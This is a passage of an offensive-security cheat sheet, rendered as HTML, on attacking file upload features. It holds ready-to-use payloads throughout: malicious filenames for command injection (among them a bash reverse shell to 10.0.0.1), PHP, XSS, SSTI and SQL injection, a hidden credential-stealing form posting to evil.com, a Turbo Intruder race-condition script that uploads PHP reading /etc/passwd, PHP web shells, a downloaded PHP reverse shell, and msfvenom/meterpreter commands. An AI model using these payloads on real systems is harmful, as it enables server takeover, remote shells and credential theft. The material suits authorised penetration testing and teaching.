+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="c1"># Get start and end</span>
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="n">start</span> <span class="o">=</span> <span class="n">a</span><span class="p">[:</span><span class="mi">40</span><span class="p">]</span>
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="n">end</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">hex</span><span class="p">()[</span><span class="mi">40</span><span class="p">:]</span>
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="n">end</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">end</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">end</span><span class="p">),</span> <span class="mi">2</span><span class="p">)])</span>
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="n">res</span> <span class="o">=</span> <span class="n">start</span> <span class="o">+</span> <span class="p">(</span><span class="n">null_size</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">end</span>
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>
+</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="5-xss-with-this-jpeg">5. XSS with this JPEG</h3>
+<p>Inject XSS to make our JPEG to execute JavaScript code. We need to set <code>charset</code> to <code>ISO-8859-1</code> for executing that.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>&lt;script charset=&quot;ISO-8859-1&quot; src=&quot;evil.jpg&quot;&gt;
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="malicious-filnames">Malicious Filnames</h2>
+<h3 id="command-injection">Command Injection</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a># If the response comes after 10 seconds, the command injection is successful.
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>test.jpg;sleep 10
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>test.jpg;sleep+10
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>test.jpg;sleep 10#
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>test.jpg;sleep 10%00
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>test.jpg|sleep 10
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>test.jpg%0Asleep 10
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>;sleep 10 test.jpg
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a># Reverse Shell
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>test.jpg;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1
+</span></code></pre></div>
+<h3 id="php-injection">PHP Injection</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>&lt;?php echo system(&#39;id&#39;);?&gt;.jpg
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>&quot;&gt;&lt;?php echo system(&#39;id&#39;);?&gt;.jpg
+</span></code></pre></div>
+<h3 id="xss">XSS</h3>
+<div data-pagefind-ignore>
+
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>&lt;script&gt;alert(1)&lt;/script&gt;.jpg
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;.jpg
+</span></code></pre></div>
+
+</div>
+
+<h3 id="ssti">SSTI</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>{{2*3}}.jpg
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>{2*3}.jpg
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>2*3.jpg
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>2*3}}.jpg
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>2*3}.jpg
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>${2*3}.jpg
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>&quot;{{2*3}}.jpg
+</span></code></pre></div>
+<h3 id="truncation">Truncation</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxtest.jpg
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>test.jpgxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span></code></pre></div>
+<h3 id="html-injection">HTML Injection</h3>
+<p>Try to upload the file which includes <strong>HTML tags</strong> in the filename. It may affect the web page.</p>
+<div data-pagefind-ignore>
+
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>&lt;h1&gt;test.jpg
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>&lt;!-- `&amp;sol;`: HTML entiry for &#39;/&#39; --&gt;
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>&quot;&gt;&lt;iframe src=&quot;http:&amp;sol;&amp;sol;10.0.0.1&quot;&gt;.jpg
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>&quot;&gt;&lt;img src=x onerror=alert(document.domain).jpg
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>&quot;&gt;&lt;form action=&quot;//evil.com&quot; method=&quot;GET&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;opacity:0;&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;opacity:0;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;!--.jpg
+</span></code></pre></div>
+
+</div>
+
+<h3 id="sql-injection">SQL Injection</h3>
+<p>Try to upload the file which includes <strong>SQL command</strong> in the filename. It may execute <strong>SQL Injection</strong> when uploading or other situations.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>--sleep(10).jpg
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="race-condition-attack">Race Condition Attack</h2>
+<p>We might be able to bypass/execute payload using race condition.<br />
+We can easily achieve that with <strong>Turbo Intruder</strong> in <strong>Burp Suite</strong>.</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>                        <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">10</span><span class="p">,)</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>    <span class="n">request_post</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;POST /avatar/upload HTTP/1.1</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="s1">Host: vulnerable.com</span>
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="s1">...</span>
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="s1">...</span>
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="s1">Connection: close</span>
+</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>
+</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a><span class="s1">------abcdefghi</span>
+</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a><span class="s1">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;exploit.php&quot;</span>
+</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a><span class="s1">Content-Type: application/x-php</span>
+</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>
+</span><span id="__span-30-15"><a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a><span class="s1">&lt;?php echo file_get_contents(&#39;/etc/passwd&#39;);  ?&gt;</span>
+</span><span id="__span-30-16"><a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>
+</span><span id="__span-30-17"><a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a><span class="s1">------abcdefghijk--</span>
+</span><span id="__span-30-18"><a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a>
+</span><span id="__span-30-19"><a id="__codelineno-30-19" name="__codelineno-30-19" href="#__codelineno-30-19"></a><span class="s1">&#39;&#39;&#39;</span>
+</span><span id="__span-30-20"><a id="__codelineno-30-20" name="__codelineno-30-20" href="#__codelineno-30-20"></a>
+</span><span id="__span-30-21"><a id="__codelineno-30-21" name="__codelineno-30-21" href="#__codelineno-30-21"></a>    <span class="n">request_get</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;GET /files/avatars/exploit.php HTTP/1.1</span>
+</span><span id="__span-30-22"><a id="__codelineno-30-22" name="__codelineno-30-22" href="#__codelineno-30-22"></a><span class="s1">Host: vulnerable.com</span>
+</span><span id="__span-30-23"><a id="__codelineno-30-23" name="__codelineno-30-23" href="#__codelineno-30-23"></a><span class="s1">...</span>
+</span><span id="__span-30-24"><a id="__codelineno-30-24" name="__codelineno-30-24" href="#__codelineno-30-24"></a><span class="s1">...</span>
+</span><span id="__span-30-25"><a id="__codelineno-30-25" name="__codelineno-30-25" href="#__codelineno-30-25"></a><span class="s1">Connection: close</span>
+</span><span id="__span-30-26"><a id="__codelineno-30-26" name="__codelineno-30-26" href="#__codelineno-30-26"></a>
+</span><span id="__span-30-27"><a id="__codelineno-30-27" name="__codelineno-30-27" href="#__codelineno-30-27"></a>
+</span><span id="__span-30-28"><a id="__codelineno-30-28" name="__codelineno-30-28" href="#__codelineno-30-28"></a><span class="s1">&#39;&#39;&#39;</span>
+</span><span id="__span-30-29"><a id="__codelineno-30-29" name="__codelineno-30-29" href="#__codelineno-30-29"></a>
+</span><span id="__span-30-30"><a id="__codelineno-30-30" name="__codelineno-30-30" href="#__codelineno-30-30"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">request_post</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-30-31"><a id="__codelineno-30-31" name="__codelineno-30-31" href="#__codelineno-30-31"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span><span id="__span-30-32"><a id="__codelineno-30-32" name="__codelineno-30-32" href="#__codelineno-30-32"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">request_get</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-30-33"><a id="__codelineno-30-33" name="__codelineno-30-33" href="#__codelineno-30-33"></a>
+</span><span id="__span-30-34"><a id="__codelineno-30-34" name="__codelineno-30-34" href="#__codelineno-30-34"></a>
+</span><span id="__span-30-35"><a id="__codelineno-30-35" name="__codelineno-30-35" href="#__codelineno-30-35"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-30-36"><a id="__codelineno-30-36" name="__codelineno-30-36" href="#__codelineno-30-36"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">complete</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
+</span><span id="__span-30-37"><a id="__codelineno-30-37" name="__codelineno-30-37" href="#__codelineno-30-37"></a>
+</span><span id="__span-30-38"><a id="__codelineno-30-38" name="__codelineno-30-38" href="#__codelineno-30-38"></a>
+</span><span id="__span-30-39"><a id="__codelineno-30-39" name="__codelineno-30-39" href="#__codelineno-30-39"></a>
+</span><span id="__span-30-40"><a id="__codelineno-30-40" name="__codelineno-30-40" href="#__codelineno-30-40"></a><span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
+</span><span id="__span-30-41"><a id="__codelineno-30-41" name="__codelineno-30-41" href="#__codelineno-30-41"></a>    <span class="n">table</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="php-payloads">PHP Payloads</h2>
+<p>After finding vulnerability, we can create a payload for exploiting the website.<br />
+Here is the example payloads of <strong>web shell</strong> and <strong>reverse shell</strong> to compromise target system.</p>
+<h3 id="web-shell">Web Shell</h3>
+<p>For example, the file name is "exploit.php".</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>// Simply showing the result of &#39;whoami&#39;.
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>&lt;?php echo system(&#39;whoami&#39;); ?&gt;
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>// This shows the content of &quot;/etc/passwd&quot;.
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>&lt;?php echo file_get_contents(&#39;/etc/passwd&#39;);  ?&gt;
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>// We can execute arbitrary commands by passing the url parameter e.g. &quot;/exploit.php?cmd=whoami&quot;
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;
+</span></code></pre></div>
+<h3 id="reverse-shell-for-linux">Reverse Shell for Linux</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a># or
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a># Edit some variables in the payload
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>$ip = &#39;&lt;attacker-ip&gt;&#39;
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>$port = 4444
+</span></code></pre></div>
+<p>Or we might be able to use the following simple script.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>&lt;?php shell_exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#39;&quot;); ?&gt;
+</span></code></pre></div>
+<p>Then open listener for getting a shell.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>nc -lvnp 4444
+</span></code></pre></div>
+<p>After uploading it, reload the page in which the payload uploaded e.g. <code>"/upload/shell.php"</code>.</p>
+<h3 id="reverse-shell-for-windows">Reverse Shell for Windows</h3>
+<p>First create a malicious executable file using msfvenom.<br />
+Replace <strong>10.0.0.1</strong> with your local ip.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a># -f: Format
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a># -p: Payload
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a># -o: Output file
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o cv-username.exe
+</span></code></pre></div>
+<p>Next start a listener for getting the target shell.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a># -x: Execute command
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>sudo msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit&quot;
+</span></code></pre></div>
+<p>After getting the shell, we will get in the meterpreter, so we need to know the meterpreter’s commands. To get a list of command, run the following in the meterpreter.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a># Usage command
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>meterpreter&gt; ?
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="other-tips">Other Tips</h2>
+<p><br /></p>
+<h3 id="craft-upload-request">Craft Upload Request</h3>
+<p>If website does not display the upload page but such functionality exists on the website, we can manually create the uploading request.<br />
+First off, we need to set <strong><code>multipart/form-data; boundary=&lt;arbitrary_characters&gt;</code></strong> to <strong>Content-Type</strong> in <strong>HTTP headers</strong> as below.<br />
+Of course we need to specify the <strong>POST</strong> method at the top of the header.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>Content-Type: multipart/form-data; boundary=abcdef
+</span></code></pre></div>
+<p>Then we can surround <strong>POST body (to upload file)</strong> with this boundary as the following.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>--abcdef
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>Content-Disposition: form-data; name=&quot;profile&quot;; filename=&quot;test.png&quot;
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>Content-Type: image/jpeg
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>some code here...
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>--abcdef--
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/security-risk/file-upload-attack.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
